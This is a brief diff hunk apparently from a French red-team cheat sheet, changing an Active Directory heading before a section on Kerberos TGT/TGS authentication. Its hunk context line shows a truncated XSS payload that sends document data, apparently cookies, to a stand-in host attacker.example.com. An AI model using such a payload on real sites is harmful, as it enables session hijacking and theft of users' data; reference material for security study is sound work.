@@ -827,7 +827,7 @@ new Image().src = 'https://attacker.example.com/?c=' + encodeURIComponent(docume
 
 
 
-# Active Directory (AD) — Fiche Red Team
+# Active Directory (AD) 
 
 
 ## 1) Flux d'authentification Kerberos dans AD (TGT, TGS)
